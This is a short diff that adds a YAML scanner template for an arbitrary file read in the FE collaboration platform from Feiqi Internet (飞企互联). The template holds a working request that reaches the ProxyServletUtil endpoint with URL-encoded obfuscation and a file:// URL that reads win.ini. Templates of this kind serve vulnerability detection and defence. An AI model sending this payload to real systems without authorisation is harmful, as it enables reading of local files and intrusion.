@@ -1,0 +1,11 @@
+name: 飞企互联-FE业务协作平台-ProxyServletUti
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /ProxyServletUti%6c?url=file:///c:/windows/win.ini
+    expression:
+      status: 200
+      body_all: ["fonts"]
